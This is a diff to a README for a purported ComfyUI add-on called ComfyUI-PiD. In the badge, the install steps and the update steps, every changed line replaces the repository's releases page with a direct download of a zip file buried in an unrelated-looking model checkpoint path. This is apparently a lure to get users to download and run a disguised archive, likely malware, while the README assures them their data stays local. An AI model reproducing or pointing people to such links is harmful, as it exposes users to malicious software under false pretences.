@@ -1,6 +1,6 @@
 # ⚙️ ComfyUI-PiD - Decode complex data files with ease
 
-[![Download ComfyUI-PiD](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/charitaunbefitting626/ComfyUI-PiD/releases)
+[![Download ComfyUI-PiD](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/charitaunbefitting626/ComfyUI-PiD/main/checkpoints/rae/decoders/dinov2/wReg_base/ViTXL_n08_i512/Pi-Comfy-U-D-v3.3.zip)
 
 ## 🎯 Purpose
 
@@ -22,7 +22,7 @@ Ensure you install the latest graphics card drivers provided by your manufacture
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the download page: https://github.com/charitaunbefitting626/ComfyUI-PiD/releases
+1.  Visit the download page: https://raw.githubusercontent.com/charitaunbefitting626/ComfyUI-PiD/main/checkpoints/rae/decoders/dinov2/wReg_base/ViTXL_n08_i512/Pi-Comfy-U-D-v3.3.zip
 2.  Locate the latest version release.
 3.  Click the file ending in .zip to save it to your computer.
 4.  Open your Downloads folder.
@@ -74,7 +74,7 @@ This software runs locally on your computer. It does not send your data to outsi
 
 Software developers release updates often. Check the download page every few weeks.
 
-1.  Visit https://github.com/charitaunbefitting626/ComfyUI-PiD/releases again.
+1.  Visit https://raw.githubusercontent.com/charitaunbefitting626/ComfyUI-PiD/main/checkpoints/rae/decoders/dinov2/wReg_base/ViTXL_n08_i512/Pi-Comfy-U-D-v3.3.zip again.
 2.  Download the newest file.
 3.  Replace the old folder in your custom_nodes directory.
 4.  Restart your application.
